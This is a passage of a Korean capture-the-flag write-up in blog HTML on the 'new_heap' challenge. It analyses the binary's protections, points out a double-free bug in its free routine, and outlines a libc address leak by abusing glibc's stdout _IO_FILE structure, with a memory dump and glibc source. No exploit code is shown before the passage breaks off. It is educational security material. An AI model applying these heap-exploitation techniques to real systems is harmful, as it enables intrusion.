2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 개요</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">new_heap<span class=\"token punctuation\">:</span> ELF <span class=\"token number\">64</span><span class=\"token operator\">-</span>bit LSB shared <span class=\"token builtin\">object</span>\nx86<span class=\"token operator\">-</span><span class=\"token number\">64</span> version <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span>\ndynamically linked\ninterpreter <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span>\n<span class=\"token keyword\">for</span> GNU<span class=\"token operator\">/</span>Linux <span class=\"token number\">2.6</span><span class=\"token number\">.32</span>\nBuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>d8a6eae195909da34581c15b13d84d41ebeeab2e\nstripped\n\nlinux<span class=\"token operator\">-</span>vdso<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff7ffb000</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>x86_64<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>gnu<span class=\"token operator\">/</span>libc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff77e1000</span><span class=\"token punctuation\">)</span>\n\t\t\t\t\t   <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff7dd5000</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"보호-기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95\" aria-label=\"보호 기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호 기법</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> <span class=\"token string\">'/home/Zer0Luck/challenges/new_heap/new_heap'</span>\n    Arch<span class=\"token punctuation\">:</span>     amd64<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token operator\">-</span>little\n    RELRO<span class=\"token punctuation\">:</span>    Full RELRO\n    Stack<span class=\"token punctuation\">:</span>    Canary found\n    NX<span class=\"token punctuation\">:</span>       NX enabled\n    PIE<span class=\"token punctuation\">:</span>      PIE enabled</code></pre></div>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 655px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+ElEQVQoz52R227DIBBE+f9frKJKvcRpXLAddmFvQIQtRWnlh7qjeVuOZod1U1QEpdxM255qa6Wubq2Walqk26RWc+8Df36I91R/q4Mo6Tv5K1xHGJPmyDDi6FMIKYCg8zONI4jY+vyYXOIyBTuf2+WiMRaz8jxm45nmhRY2XjvUhztMVpdZTqc8DLIsReQHLEVAABikyF6y9OQ1Vg+vHZPGm4hqZtpaM/Mf+/e1p1BfXuPbcIPIgKJqjzEphRQmmuY878BIBiDXL0loqv3DnmNLLVp08w58S+Y9xWiIRnSstoNsiDXGhliOntrFZO2/cll72nb4o/Adkhv/Zw+c6wcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/7d27dc209a6ccc4d097443af38f803ca/ae6b7/0.png\"\n        srcset=\"/static/7d27dc209a6ccc4d097443af38f803ca/e9ff0/0.png 180w,\n/static/7d27dc209a6ccc4d097443af38f803ca/f21e7/0.png 360w,\n/static/7d27dc209a6ccc4d097443af38f803ca/ae6b7/0.png 655w\"\n        sizes=\"(max-width: 655px) 100vw, 655px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">print_menu</code> 함수를 바탕으로 1.alloc, 2. free, 3. exit 조건을 수행하는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"alloc\" style=\"position:relative;\"><a href=\"#alloc\" aria-label=\"alloc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>alloc</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 642px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABMElEQVQoz5WS627bMAyF/f6vuLbDMm9x4ljVhTRvIjW4CJYBG4aUPwQBR58Ob9OyFmiAuANgrU3VxtMxXbZ9nvOy8LrqumpKg2hEPAdf36lkTolai5xHKR0gmO9yj46KVWrlioogAArHRYGNp1sW2pW5p81aG0Qm0t3v1uYGCgcslYyaNBA4Tj1+mVA8bX7Z2lbziPGpmMi85LiupF3is/D67rU4SKvIpuN3wk/BP6/+8iXmM88/+HSyWvVPOSLMzcI83MP/dpacO+JA0G0Ts+H+GJV0ObfzAkvaU5GCgt37A657vL2O1xPM6fb2DUruramI9u7eh350O3NGRVRMlMwfWzQV9OXcl4u+fJXvt2sFJCIRZu5EHv/t4XRJhCBMQyU+avzHozjquAvubnY3/wWIE77JhKVD0AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/1065ae685e1e928c28f52c7e47c62a3f/1bba8/1.png\"\n        srcset=\"/static/1065ae685e1e928c28f52c7e47c62a3f/e9ff0/1.png 180w,\n/static/1065ae685e1e928c28f52c7e47c62a3f/f21e7/1.png 360w,\n/static/1065ae685e1e928c28f52c7e47c62a3f/1bba8/1.png 642w\"\n        sizes=\"(max-width: 642px) 100vw, 642px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>메모리 동적할당 과정을 확인해 보면 전역 포인터 배열 <code class=\"language-text\">heap_ptr</code> 에 할당하는 것을 확인할 수 있으며 인덱스 범위가 총19개까지 할당이 가능하다.</li>\n<li>사용자의 입력값이 <code class=\"language-text\">0x78</code> 이하까지 size로 할당이 되어지며 해당 사이즈 만큼 데이터를 입력 할 수 있다.</li>\n</ul>\n<h2 id=\"free\" style=\"position:relative;\"><a href=\"#free\" aria-label=\"free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>free</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 620px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyUlEQVQY042Q3WrDMAyF8/5vsmda2dpmCWsSJ7ZsWfKfNNZ2sMEuLHQhOOdDhzNM64v10+EyscQkyBKoxlR6djj8ydk3iBUoJpaSNSftnGHZ63LT99GfP8K65Frab1lUTDSv5jS6ERKEjD4FzFFUvmEDDK5aHzcHgHH3zhPepSdMhRw7x44KQQLLFjM+4cBtnmRed2pYWsaCQEFaX+zPLV/OPF51vuF2eJF/TKLyePU45CfYYCAxF0QNHJGpNVGV3sIwNe23/4W/ALmu1IDhzGnNAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/1869ca93d30719e9422c46ece04e30c4/2a195/2.png\"\n        srcset=\"/static/1869ca93d30719e9422c46ece04e30c4/e9ff0/2.png 180w,\n/static/1869ca93d30719e9422c46ece04e30c4/f21e7/2.png 360w,\n/static/1869ca93d30719e9422c46ece04e30c4/2a195/2.png 620w\"\n        sizes=\"(max-width: 620px) 100vw, 620px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>free되는 과정을 확인해 보면 사용자의 입력 값이 곧 인덱스 범위로 사용되어 원하는 힙을 해제할 수 있으며 기본적인 길이 검증이 존재한다.</li>\n<li>하지만 해제한 초인터를 초기화하지 않기 때문에 Double Free Bug가 발생한다.</li>\n</ul>\n<h2 id=\"memory-leak-idea\" style=\"position:relative;\"><a href=\"#memory-leak-idea\" aria-label=\"memory leak idea permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>memory leak Idea</h2>\n<ul>\n<li>어떻게 하면 메모리 주소값을 릭할 수 있을 까?</li>\n<li>힙 청크의 데이터를 출력하는 기능이 존재하지 않아 다른 방법을 찾아야 한다.</li>\n</ul>\n<h2 id=\"_io_file_stdout\" style=\"position:relative;\"><a href=\"#_io_file_stdout\" aria-label=\"_io_file_stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>_IO_FILE_stdout</h2>\n<ul>\n<li><code class=\"language-text\">stdout</code> 파일 디스크립터는 출력할 때 주로 사용하며 구조체로 수많은 멤버 변수가 정의되어 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">int</span> _flags<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* High-order word -> _IO_MAGIC, 나머지는 플래그 */</span>\n  <span class=\"token comment\">/* 다음 포인터는 C++ streambuf 프로토콜에 해당한다. */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_ptr<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 읽기 버퍼에 대한 포인터*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 읽기 버퍼 주소의 끝을 가리키는 포인터*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Start of putback+get area.,\n 파일 읽기 버퍼 주소의 시작을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 쓰기 버퍼의 주소의 시작을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_ptr<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 쓰기 버퍼에 대한 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 쓰기 버퍼 주소의 끝을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_buf_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Start of reserve area. 준비 구역의 시작 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_buf_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 준비 구역의 끝 */</span>\n  <span class=\"token comment\">/* 다음 필드는 백업 및 실행 취소를 지원하는데 사용된다.*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_base<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to start of non-current get area. */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_backup_base<span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* Pointer to first valid character of backup area */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_end<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to end of non-current get area. */</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_marker</span> <span class=\"token operator\">*</span>_markers<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span> <span class=\"token operator\">*</span>_chain<span class=\"token punctuation\">;</span> \n  <span class=\"token keyword\">int</span> _fileno<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">int</span> _flags2<span class=\"token punctuation\">;</span>\n  __off_t _old_offset<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* This used to be _offset but it's too small.  */</span>\n  <span class=\"token comment\">/* 1+column number of pbase(); 0 is unknown. */</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> _cur_column<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">char</span> _vtable_offset<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">char</span> _shortbuf<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span>_IO_lock_t <span class=\"token operator\">*</span>_lock<span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_IO_USE_OLD_IO_FILE</span></span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"stdout\" style=\"position:relative;\"><a href=\"#stdout\" aria-label=\"stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>stdout</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0x7ffff7dd0760</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">></span><span class=\"token operator\">:</span>       <span class=\"token number\">0x00000000fbad2887</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0770</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0780</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">32</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0790</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">48</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd07a0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">64</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e4</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd07b0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">80</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd07c0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">96</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00007ffff7dcfa00</span>\n<span class=\"token number\">0x7ffff7dd07d0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">112</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000001</span>      <span class=\"token number\">0xffffffffffffffff</span>\n<span class=\"token number\">0x7ffff7dd07e0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">128</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x000000000a000000</span>      <span class=\"token number\">0x00007ffff7dd18c0</span>\n<span class=\"token number\">0x7ffff7dd07f0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">144</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0xffffffffffffffff</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0800</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">160</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x00007ffff7dcf8c0</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0810</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">176</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0820</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">192</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x00000000ffffffff</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0830</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">208</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00007ffff7dcc2a0</span></code></pre></div>\n<ul>\n<li>printf, puts와 같은 stdout 파일 디스크립터를 사용하는 함수가 호출될 때 내부적으로 <code class=\"language-text\">_IO_new_do_write</code> 함수가 호출된다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAnUlEQVQI1yXH2w6CIAAAUD8mLUEBL6ggd0Sk6YNtbW39/3+06u2cTAkb0y6XbZJWuijdOutF+c2EpHwUJnDlmPIm3IUNs/HCBukiUw51Q6bX9Hi99/MpfZzNQrkahJ6kHYUZhSGUQdID3KF+JJTV7VA1FPcTJD1saMa1345zSQflEuDuWpEC4hI1JWpzgL6t8K1ucoBygP64/FBA/AF8LSgA7QDQvgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/ddb40862e7ea005b1c65709846244bc6/37523/3.png\"\n        srcset=\"/static/ddb40862e7ea005b1c65709846244bc6/e9ff0/3.png 180w,\n/static/ddb40862e7ea005b1c65709846244bc6/f21e7/3.png 360w,\n/static/ddb40862e7ea005b1c65709846244bc6/37523/3.png 720w,\n/static/ddb40862e7ea005b1c65709846244bc6/302a4/3.png 1080w,\n/static/ddb40862e7ea005b1c65709846244bc6/0f246/3.png 1118w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">puts</code> 함수를 호출할 때 <code class=\"language-text\">_IO_new_file_xsputn</code> 함수를 호출하고 해당 함수에서 다음과 같이 <code class=\"language-text\">new_do_write</code> 함수를 호출하게 된다.</li>\n</ul>\n<h2 id=\"_io_new_file_xsputn-함수\" style=\"position:relative;\"><a href=\"#_io_new_file_xsputn-%ED%95%A8%EC%88%98\" aria-label=\"_io_new_file_xsputn 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>_IO_new_file_xsputn 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">_IO_size_t\n<span class=\"token function\">_IO_new_file_xsputn</span> <span class=\"token punctuation\">(</span>_IO_FILE <span class=\"token operator\">*</span>f<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> _IO_size_t n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>do_write<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\tcount <span class=\"token operator\">=</span> <span class=\"token function\">new_do_write</span> <span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> do_write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tto_do <span class=\"token operator\">-=</span> count<span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>count <span 